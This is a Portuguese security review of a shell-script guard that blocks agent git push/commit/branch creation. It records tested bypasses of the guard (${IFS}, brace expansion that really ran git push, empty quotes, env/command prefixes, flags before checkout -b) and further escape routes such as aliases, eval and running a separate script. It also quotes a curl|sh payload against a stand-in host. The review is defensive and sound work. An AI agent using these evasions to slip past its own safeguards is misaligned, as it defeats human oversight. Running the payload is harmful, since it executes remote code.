# Revisão de segurança — `git-branch-guard` (ML-1A / ML-4A)

> Autor: `hades-tf` | Data: 2026-08-16
> Escopo: `scripts/trackfw-git-branch-guard.sh` e as 5 outras cópias sincronizadas, alteradas pelo
> ML-1A do `ROADMAP-2026-08-16-higiene-sete-debitos-acumulados-da-entrega-de-plugins-e-da-release-7-0-0.md`.
> Método: leitura do código + **execução direta** do script contra os dois payloads que o arquiteto
> já havia medido, mais um conjunto adversarial próprio (não coberto pelos cenários 60/61 nem pelos
> testes Go/Node/Python existentes).

## Veredito

**BLOQUEAR.**

**Base do veredito, para não ficar ambíguo:** rodei a bateria adversarial completa (A1–A4, B1)
também contra a versão do guard **anterior** ao ML-1A (`git show b9ced66^:scripts/trackfw-git-branch-guard.sh`,
o commit imediatamente antes deste ML). **Todos os vetores já passavam no guard antigo** — ML-1A
não regrediu nenhum deles. O delta próprio do ML-1A está limpo e verificado: a prosa que antes
bloqueava incorretamente agora passa (`exit 0`), e `git switch -c` que antes passava incorretamente
agora bloqueia (`exit 2`) — exatamente o que o ML se propôs a fazer, sem efeito colateral.

**Então por que bloquear um ML cujo próprio diff está limpo?** Porque o ML não se limitou a corrigir
o que se propôs: reescreveu a segmentação inteira e a vendeu, no comentário do script e na nota de
execução do roadmap, como "segmentação *quote-aware*" — linguagem que sugere um nível de robustez
contra evasão que o guard **nunca teve e continua sem ter**. Isso é o cenário que a barreira foi
desenhada para pegar: **confiança falsa é pior que guard nenhum**, porque um controle que ninguém
acredita ser sólido continua sendo tratado com cautela; um controle "corrigido" e testado que ainda
tem bypasses triviais (inclusive um que **executa `git push` de verdade** — reproduzi a execução,
não só a leitura, e só não houve push remoto porque a branch local de teste não tinha upstream)
convida a esse ML ser citado como "o guard agora é robusto", quando não é. O bloqueio é sobre isso:
a lacuna é pré-existente, mas o ML criou um cenário de falsificação (60/61) e comentários que
implicam cobertura que não existe — e não há, em lugar nenhum do roadmap ou do ADR, uma declaração
explícita de que A1–A4/B1 ficam abertos. Depois desta barreira, essa declaração passa a ser
obrigatória (ou a correção).

## O que foi medido (não inferido)

Todos os comandos abaixo foram executados literalmente contra
`./scripts/trackfw-git-branch-guard.sh` (idêntico às outras 5 cópias — ver seção C).

### A — A correção do falso-positivo abriu evasão real? **Nenhum vetor é regressão do ML-1A — mas 4 já existiam e continuam abertos**

| # | Vetor | Comando testado | Guard | Bash real |
|---|---|---|---|---|
| A1 | **Expansão de `${IFS}` não quotada** | `git${IFS}push` | `exit 0` (permite) | `bash -c 'echo git${IFS}push'` → `git push` (duas palavras) |
| A2 | **Brace expansion como o próprio comando** | `{git,push}` | `exit 0` (permite) | `bash -c '{git,push} --dry-run'` → **executou `git push` de verdade**, saída `fatal: ... has no upstream branch` (não houve push real só porque a branch de teste não tem upstream — se tivesse, o push teria ocorrido) |
| A3 | **Concatenação de aspas vazias dentro da palavra** | `g""it push` | `exit 0` (permite) | `bash -c 'echo g""it push'` → `git push` |
| A4 | **Prefixo `env`/`command`** | `env git commit -m "x"` / `command git push` | `exit 0` (permite) | qualquer shell POSIX: `env git commit` e `command git push` executam `git commit`/`git push` literalmente — não é obfuscação, é uso normal de `env`/`command` |

**Causa raiz comum, não três bugs separados:** `match_subcommand()` faz *word-splitting* ingênuo
(`set -- $seg_trimmed`) sobre o texto bruto, sem nunca *avaliar* o texto como o shell real avalia.
O guard trata `git${IFS}push`, `{git,push}` e `g""it push` como um único token opaco — nenhum deles
é igual à string literal `"git"` — então `[ "$base" = "git" ] || continue` nunca dispara. O **bash
real que efetivamente executa o comando**, porém, faz expansão de parâmetro, expansão de chaves e
remoção de aspas *antes* de decidir quais são os "argv[0]" e os argumentos — produzindo exatamente
`git push` como dois tokens reais. O guard não é um parser de shell; ele confia que o texto já vem
tokenizado como o autor pretendia, e isso é falso para qualquer subagente (ou humano) que use essas
construções — nenhuma delas é exótica, são idiomas conhecidos de evasão de filtros de comando
baseados em string.

**A4 tem causa distinta, mesma classe:** `[ "$base" = "git" ] || continue` só dispara quando o
**primeiro** token do segmento é (por basename) `git`. Em `env git commit -m x`, o primeiro token é
`env` — a checagem falha, o `continue` pula para o próximo segmento, e como não há mais segmentos
(não há `;`/`&&`/etc.), a função retorna sem nunca examinar `git` como segundo token. `command git
push` é idêntico. Nenhum dos dois é uma técnica de disfarce — são as formas *padrão* de invocar um
programa ignorando alias/função (`command`) ou com ambiente customizado (`env`), amplamente usadas
em scripts legítimos.

**Regressão? Medido, não inferido — nenhuma.** Peguei a versão do guard imediatamente anterior a
este ML (`git show b9ced66^:scripts/trackfw-git-branch-guard.sh`, o `sed` cego que a nota do ML
substituiu) e rodei os mesmos payloads A1–A4 e B1 contra ela: **`exit 0` (permite) em todos**,
idêntico ao guard atual. `match_subcommand`/`quote_aware_split` deste ML mudam a forma como
separadores (`;`, `&&`, `||`, `|`, heredoc) dentro de aspas são neutralizados — não tocam em `$`,
`{`, aspas vazias adjacentes, nem em prefixos `env`/`command`. A lacuna é **pré-existente e
inalterada** pelo ML-1A; o que preocupa não é o ML tê-la criado (não criou), é o ML descrever a nova
segmentação como "quote-aware" sem qualificar que isso resolve só separadores citados, não
tokenização geral — ver "Base do veredito" no topo.

### A (secundário) — vetores testados que **não** funcionaram (path feliz confirmado)

```
./scripts/trackfw-git-branch-guard.sh 'trackfw commit -m "veja: git status; git push é bloqueado"' -> exit 0  (correto)
./scripts/trackfw-git-branch-guard.sh 'git commit -m "x"; git push'                                 -> exit 2  (correto)
./scripts/trackfw-git-branch-guard.sh 'git switch -c nova'                                          -> exit 2  (correto)
```
Prosa com heredoc, comandos reais encadeados por `;`/`&&`/`||`/`|`, `switch -c/-C/--create` com flag
antes, path absoluto (`/usr/bin/git`) — todos continuam bloqueados como esperado. A regressão
verificada por leitura de `internal/generators/git_branch_guard_test.go` (28 testes Go) mais os
Cenários 60/61 do `check-gates-falsify.sh` cobre bem esse eixo. **O problema não é regressão no que
já era testado — é ausência total de cobertura para A1/A2/A3/A4.**

### Vetores adicionais testados, sem sucesso de evasão

```
git -c user.name=x commit -m x     -> bloqueado (flags -c/-C globais são corretamente puladas)
git\n commit                        -> segue tratado como prosa/segmento, não bypassa commit real
```

(Ambos também bloqueados na versão pré-ML-1A — não são achado novo nem risco residual introduzido.)

## B — A brecha de `git switch -c` foi fechada? **Parcialmente — achei uma variante irmã não fechada**

`switch -c/-C/--create/--force-create` está corretamente bloqueado, inclusive com flag antes
(`git switch --track -c feat/x`). Testei variantes adjacentes:

| Comando | Resultado medido | Esperado? |
|---|---|---|
| `git checkout -b nova` | `exit 2` bloqueado | ✅ |
| `git checkout -q -b nova` | **`exit 0` — passa** | ❌ bypass |
| `git checkout --no-track -b nova` | **`exit 0` — passa** | ❌ bypass |
| `git checkout --quiet -b nova` | **`exit 0` — passa** | ❌ bypass |
| `git worktree add -b nova ../wt` | `exit 0` — passa | ⚠️ não coberto pelo escopo declarado, mas cria branch de verdade |
| `git checkout --orphan nova` | `exit 0` — passa | ⚠️ cria (órfã) e troca de branch; fora do escopo declarado mas mesma classe |
| `git branch nova` + depois `git checkout nova` (dois comandos separados) | ambos `exit 0` | ⚠️ contorna a intenção de "checkout -b" em dois passos; `checkout` sem `-b` é **intencionalmente** permitido (troca de branch existente é uso legítimo) — ver nota abaixo |

**B1 é o achado sério deste bloco:** o matcher de `checkout` só verifica se o **token
imediatamente seguinte** a `checkout` é literalmente `-b` (`if [ "${1:-}" = "-b" ]`). Isso é
assimétrico em relação ao matcher de `switch`, que varre **todos** os tokens remanescentes
procurando por `-c/-C/--create` — comentário do próprio script até documenta essa escolha para
`switch --track -c feat/x`, mas o mesmo cuidado não foi aplicado a `checkout`. Qualquer flag entre
`checkout` e `-b` (`-q`, `--quiet`, `--no-track`, `--progress`, etc. — todas flags reais e comuns do
`git checkout`) evade a detecção. O teste Go `TestGitBranchGuard_CheckoutDashB_WithFlagsBefore_Blocks`
testa **apenas** `-C .` (uma flag *global* do git, antes do subcommand, consumida pelo laço
`-C|-c|--work-tree|--git-dir|--namespace`), não uma flag *entre* `checkout` e `-b` — não cobre B1.
**Também pré-existente, não regressão:** confirmado contra o guard anterior ao ML-1A — a checagem
`if [ "${1:-}" = "-b" ]` para `checkout` não foi tocada por este ML (só a detecção de `switch` foi
adicionada), e o mesmo `exit 0` já ocorria antes.

**B2, `git worktree add -b` / `checkout --orphan`, é fora do escopo textual do item 2** (que fala
especificamente de "forma alternativa a `checkout -b`", ou seja, `switch -c`), mas cria branches de
verdade sem passar pelo `trackfw branch new` — reporto porque a barreira pediu para não me limitar à
"felicidade" do caminho já coberto.

**B3, o dois-passos `branch` + `checkout`, é uma limitação de design pré-existente e não uma
regressão deste ML** — bloquear `git checkout <nome-existente>` sem `-b` quebraria uso legítimo
constante (trocar de branch já existente é rotina). Registro como risco residual aceito, não como
achado a corrigir aqui.

## C — As cópias seguem íntegras? **SIM, confirmado por execução, não só por leitura**

1. Extraí programaticamente o conteúdo que `internal/generators/scaffold.go`'s
   `GenerateGitBranchGuardScript` realmente escreve (rodei o gerador Go de verdade contra um
   diretório temporário) e comparei byte a byte com `scripts/trackfw-git-branch-guard.sh`:
   **`diff` vazio, idênticos.**
2. Rodei `go test ./internal/generators/... -run GitBranchGuard -v`: **28/28 testes verdes**,
   incluindo `TestGitBranchGuard_ChainedCommand_SecondGitBlocked`,
   `TestGitBranchGuard_SwitchDashC_Blocks`, `TestGitBranchGuard_SwitchDashC_FlagBeforeCreate_Blocks`,
   `TestGitBranchGuard_CommitMessageLineStartingWithGitCheckoutDashB_DoesNotBlock`.
3. Rodei `node --test npm/tests/git_branch_guard.test.js npm/tests/git_branch_guard_hook_integrity.test.js`:
   **39 + 16 passaram**, incluindo o teste explícito `GIT_BRANCH_GUARD_SCRIPT_REFERENCE é
   byte-idêntico ao que generateGitBranchGuardScript emite` e `git_branch_guard_script_integrity: 1
   byte alterado dispara violação` (prova que o comparador de integridade não é vácuo).
4. Rodei `python3 -m pytest pypi/tests/test_git_branch_guard.py pypi/tests/test_git_branch_guard_validator.py`:
   **43 passed, 2 subtests passed.**
5. `trackfw validate` (binário real `bin/trackfw`) roda limpo com **0 erros** (16 warnings, todos
   sobre REQs sem ADR/roadmap linkado — nada relacionado ao guard).

Conclusão: as 6 cópias estão **byte-idênticas hoje**, confirmado por execução real (não só leitura).
Item C: **íntegro, aprovado.**

**Ressalva sobre o tipo de cobertura, para não superestimar a garantia:** o que medi cobre
Go-const == `scripts/`-referência (diff direto, meu) e, dentro de cada stack, gerador == referência
de integridade do próprio validador (`GIT_BRANCH_GUARD_SCRIPT` vs `GIT_BRANCH_GUARD_SCRIPT_REFERENCE`
em Node; equivalente em Python). **Não existe** um teste que gere o script pelos 3 stacks e compare
os três resultados entre si numa única asserção — ao contrário do credential-guard, que tem
`TestCredentialGuardScript_ParityAcrossStacks` (`internal/generators/credential_guard_test.go:125`)
comparando Go vs Node vs Python diretamente. Busquei o equivalente para o git-branch-guard
(`grep -rn ParityAcrossStacks internal/generators/*.go` e `grep -rln trackfw-git-branch-guard
scripts/check-*parity*.sh`) e **não encontrei nenhum**. Hoje as 6 cópias batem porque cada uma foi
atualizada manualmente em conjunto (a nota de execução do ML-1A confirma isso) e os testes por-stack
passam — mas nada impede duas delas divergirem no futuro com `make quality` inteiramente verde,
porque não há uma única asserção cruzando os 3 stacks para este script específico. Não é o achado
principal desta barreira, mas é uma lacuna de cobertura real — registro para o corretor considerar
um `TestGitBranchGuardScript_ParityAcrossStacks` no mesmo molde do credential-guard.

## Cobertura de falsificação (P4) — suficiente para A/B só parcialmente

Os Cenários 60/61 de `check-gates-falsify.sh` provam exatamente o que o arquiteto mediu (switch-c
bloqueado, prosa permitida) e provam não-vacuidade (corrompendo o literal correspondente no gerador
Go e confirmando que o comportamento volta a vazar). **Isso é suficiente para o que os cenários se
propõem a testar — mas não cobre nenhum dos achados A1/A2/A3/A4/B1 acima**, porque nenhum deles
depende de um "literal corrompido"; são lacunas estruturais do algoritmo de tokenização em si,
presentes até no código são.

## Risco residual, se o veredito fosse aprovar (não é — registrado para o corretor)

Mesmo depois de corrigir A1–A4 e B1, o guard continuará sendo um filtro de string sobre o texto do
comando, não um parser de shell — `eval`, funções shell definidas antes, aliases de git
(`git -c alias.x="push" x`), ou um subagente que grava um script `.sh` e o executa via `bash foo.sh`
continuam fora do alcance de qualquer guard desta classe. Isso é aceitável como limite de design
(documentado no próprio comentário do script: "tripwire para o caso óbvio, não defesa contra um
adversário competente" — mesma linguagem usada em `CLAUDE.md` para o checker de terceiros), **mas
A1–A4 não são adversário competente: são idiomas de shell do dia a dia** (`${IFS}`, brace expansion,
aspas vazias adjacentes, `env`/`command`) — não exigem sofisticação, um subagente ou usuário poderia
produzi-los sem intenção maliciosa e ainda assim escapar do guard.

## Recomendação para quem for corrigir (não implementado aqui — fora do escopo desta barreira)

**Não** deixar o bash real avaliar/expandir o texto do comando para "tokenizar corretamente" — isso
seria pior que o problema atual. O guard roda sobre texto potencialmente controlado por quem está
tentando escapar dele; se a correção passar esse texto por qualquer forma de expansão real do shell
(`eval`, `bash -c` interpretando o texto além de citá-lo como argumento literal, `` `...` ``,
`$(...)`), um comando como `git commit -m "$(curl evil.sh | sh)"` executaria o payload **dentro do
próprio guard**, com os mesmos privilégios do hook — isto é, o "fix" abriria RCE onde hoje só há
bypass de política. Duas direções seguras, sem essa armadilha:

1. **Lexer real, sem avaliação** — usar uma biblioteca de tokenização de shell que faz *só* a
   análise léxica (remoção de aspas, reconhecimento de `$var`/`${var}`/`{a,b}` como tokens especiais
   a **recusar**, nunca a expandir) sem executar nada. Ex.: `shlex` em Python (a stack pypi já
   depende dela) ou um lexer Go equivalente (`mvdan.cc/sh/v3/syntax` faz parse sem eval). Reescrever
   o `match_subcommand` em awk/sh para reconhecer manualmente cada nova classe de obfuscação
   descoberta é o padrão atual e é exatamente por isso que A1–A4 escaparam: joga-se whack-a-mole
   contra a gramática do shell.
2. **Fail-closed sobre os próprios metacaracteres de obfuscação** — mais barato e alinhado à postura
   de "tripwire" que o script já assume: se o texto do comando contém `${`, `$(`, `` ` ``, ou um
   padrão de brace expansion (`{...,...}`) **em qualquer lugar**, bloquear (ou pedir revisão humana)
   independente de reconhecer `git` explicitamente — nenhum uso legítimo de `trackfw commit -m` ou
   `trackfw ship` deveria precisar dessas construções no texto do comando. Mais simples de auditar,
   sem risco de eval, ao custo de falsos positivos ocasionais em mensagens de commit muito elaboradas
   (aceitável para um guard que prefere bloquear demais a deixar passar).

## Escopo não coberto por esta barreira

Confirmo que os demais itens da higiene (i18n, `site/`, `cli-parity.md`, `ship`) não foram tocados
por esta revisão — fora do escopo desta barreira, como o roadmap determina.
